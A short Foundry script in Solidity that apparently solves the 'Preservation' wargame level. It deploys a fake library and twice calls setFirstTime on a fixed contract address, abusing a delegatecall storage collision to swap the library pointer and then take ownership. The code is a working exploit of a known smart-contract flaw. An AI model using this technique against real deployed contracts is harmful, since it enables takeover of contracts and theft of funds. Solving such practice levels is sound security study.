// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {FakeLibrary} from "../src/Preservation.sol";

interface IPreservation {
      function setFirstTime(uint) external;
}

contract PreservationScript is Script {

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("pvt_key");
        address myAddress = vm.envAddress("public_key");
        vm.startBroadcast(deployerPrivateKey);
        
        FakeLibrary fake = new FakeLibrary();
        IPreservation ogAddress = IPreservation(0x966de308F0C6cFF254AF5d2561869f16Fe00333E);
        
        ogAddress.setFirstTime(uint256(uint160(address(fake))));
        
        ogAddress.setFirstTime(uint256(uint160(myAddress)));

        vm.stopBroadcast();
    }
}
